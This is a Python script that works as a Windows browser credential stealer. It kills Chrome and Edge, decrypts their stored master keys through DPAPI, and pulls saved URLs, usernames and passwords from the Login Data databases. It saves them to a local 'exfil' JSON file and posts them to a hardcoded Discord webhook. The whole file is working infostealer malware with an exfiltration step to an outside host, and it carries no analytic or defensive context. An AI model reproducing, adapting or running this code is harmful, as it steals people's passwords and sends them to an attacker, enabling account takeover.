import os
import sys
import json
import sqlite3
import shutil
import base64
import traceback
import requests
import subprocess
import time
from datetime import datetime

# ====== ERROR LOGGING (writes to file even if console is hidden) ======
LOG_FILE = "extraction_log.txt"

def log(msg, also_print=True):
    """Write message to log file and optionally print to console."""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    full = f"[{timestamp}] {msg}"
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(full + '\n')
    except:
        pass
    if also_print:
        print(full)

def log_exception(e):
    """Log full exception traceback."""
    tb = traceback.format_exc()
    log(f"EXCEPTION: {e}\n{tb}")

# ====== START LOGGING ======
log("=== EXTRACTION STARTED ===")

# ====== IMPORTS ======
try:
    import win32crypt
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    log("Modules loaded successfully.")
except Exception as e:
    log_exception(e)
    sys.exit(1)

# ====== CONFIG ======
WEBHOOK_URL = "https://discord.com/api/webhooks/1517673359876296704/Uauf-iR1yt_8NYyxOZJnI2S9YIWMisMJ5oLph0geBB04A-eCuiZ2-rnj_IS-gPjMehv8"
LOCAL_APPDATA = os.environ.get('LOCAL_APPDATA', '')
if not LOCAL_APPDATA:
    log("LOCALAPPDATA not found – are you on Windows?")
    sys.exit(1)

BROWSERS = [
    {"name": "Chrome", "db": os.path.join(LOCAL_APPDATA, 'Google\\Chrome\\User Data\\Default\\Login Data'),
     "state": os.path.join(LOCAL_APPDATA, 'Google\\Chrome\\User Data\\Local State'), "proc": "chrome.exe"},
    {"name": "Edge", "db": os.path.join(LOCAL_APPDATA, 'Microsoft\\Edge\\User Data\\Default\\Login Data'),
     "state": os.path.join(LOCAL_APPDATA, 'Microsoft\\Edge\\User Data\\Local State'), "proc": "msedge.exe"}
]

# ====== FUNCTIONS ======
def kill_browser(p):
    try:
        subprocess.run(["taskkill", "/F", "/IM", p], capture_output=True, check=False)
        time.sleep(1.5)
        log(f"Killed {p}")
    except Exception as e:
        log(f"Failed to kill {p}: {e}")

def decrypt_master_key(b64key):
    try:
        raw = base64.b64decode(b64key)
        if raw[:5] == b'DPAPI':
            raw = raw[5:]
        return win32crypt.CryptUnprotectData(raw, None, None, None, 0)[1]
    except Exception as e:
        log(f"Master key decryption error: {e}")
        return None

def decrypt_pw(blob, key):
    if not blob or len(blob) < 3:
        return "[EMPTY]"
    try:
        v = blob[0]
        if v != 1:
            return win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1].decode('utf-8')
        nonce = blob[1:13]
        ct = blob[13:-16]
        tag = blob[-16:]
        return AESGCM(key).decrypt(nonce, ct + tag, None).decode('utf-8')
    except Exception as e:
        return f"[FAIL: {e}]"

def extract(db, key):
    if not os.path.exists(db):
        log(f"DB not found: {db}")
        return []
    tmp = "tmp.db"
    try:
        shutil.copy2(db, tmp)
    except Exception as e:
        log(f"Failed to copy DB: {e}")
        return []
    res = []
    try:
        conn = sqlite3.connect(tmp)
        cursor = conn.execute("SELECT origin_url, username_value, password_value FROM logins")
        rows = cursor.fetchall()
        log(f"Found {len(rows)} rows in {db}")
        for url, user, pw in rows:
            decrypted = decrypt_pw(pw, key) if pw else ""
            res.append({"url": url, "username": user or "", "password": decrypted})
        conn.close()
    except Exception as e:
        log(f"SQL error: {e}")
    finally:
        try: os.remove(tmp)
        except: pass
    return res

def send_to_discord(all_data):
    total = sum(len(b['creds']) for b in all_data.values())
    if total == 0:
        log("No credentials to send.")
        return
    lines = [f"**📦 Exfiltrated ({total})**"]
    for name, b in all_data.items():
        if b['creds']:
            lines.append(f"\n**{name} ({len(b['creds'])})**")
            for c in b['creds'][:15]:
                lines.append(f"  {c['url']} | {c['username']} | {c['password']}")
    msg = "\n".join(lines)[:1900]
    try:
        r = requests.post(WEBHOOK_URL, json={"content": msg}, timeout=10)
        if r.status_code in (200, 204):
            log("✅ Successfully sent to Discord")
        else:
            log(f"❌ Discord error: {r.status_code} - {r.text[:200]}")
    except Exception as e:
        log(f"❌ Discord exception: {e}")

# ====== MAIN ======
def main():
    log("Killing browser processes...")
    for b in BROWSERS:
        kill_browser(b["proc"])

    all_data = {}
    for b in BROWSERS:
        log(f"\nProcessing {b['name']}...")
        key = None
        if os.path.exists(b["state"]):
            try:
                with open(b["state"], 'r', encoding='utf-8') as f:
                    state = json.load(f)
                enc = state.get('os_crypt', {}).get('encrypted_key')
                if enc:
                    key = decrypt_master_key(enc)
                    if key:
                        log(f"Master key decrypted for {b['name']}")
                    else:
                        log(f"Master key decryption FAILED for {b['name']}")
                else:
                    log(f"No encrypted_key in {b['name']} state")
            except Exception as e:
                log(f"Error reading state: {e}")
        else:
            log(f"State file not found: {b['state']}")

        creds = extract(b["db"], key) if os.path.exists(b["db"]) else []
        all_data[b["name"]] = {"creds": creds}
        log(f"{b['name']}: extracted {len(creds)} credentials")

    # Save JSON
    out = f"exfil_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    try:
        with open(out, 'w', encoding='utf-8') as f:
            json.dump(all_data, f, indent=2, ensure_ascii=False)
        log(f"JSON saved: {out}")
    except Exception as e:
        log(f"Failed to save JSON: {e}")

    # Send to Discord
    send_to_discord(all_data)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        log_exception(e)
    log("=== EXTRACTION FINISHED ===")